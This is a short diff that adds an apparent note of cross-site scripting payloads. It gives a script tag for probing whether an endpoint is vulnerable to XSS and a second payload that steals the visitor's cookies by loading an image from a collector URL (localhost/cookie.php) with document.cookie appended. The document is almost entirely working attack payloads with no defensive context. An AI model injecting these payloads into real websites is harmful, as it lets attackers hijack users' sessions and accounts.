@@ -1,0 +1,5 @@
+Identify an XSS endpoint:
+`<script>debugger;</script>`
+stealing cokkie:
+`<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>`
+
